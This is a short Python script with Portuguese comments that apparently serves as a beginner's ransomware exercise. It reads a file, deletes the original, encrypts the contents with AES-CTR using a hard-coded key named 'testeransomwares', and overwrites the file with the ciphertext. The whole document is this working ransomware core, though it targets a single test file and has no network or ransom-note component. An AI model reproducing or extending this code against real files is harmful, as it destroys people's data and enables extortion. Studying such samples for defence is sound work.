import os
import pyaes


##so abre, lê o arquivo e fecha
file_name = 'teste.txt'
file = open(file_name, 'rb')
file_data = file.read()
file.close


##remover arquivo original

os.remove(file_name)


##chave crypt(16char)
key= b"testeransomwares"
aes = pyaes.AESModeOfOperationCTR(key)

##encrypt
crypto_data = aes.encrypt(file_data)

##salvando arquivo encriptografado

new_file = file_name
new_file = open(f'{new_file}', 'wb')
new_file.write(crypto_data)
new_file.close()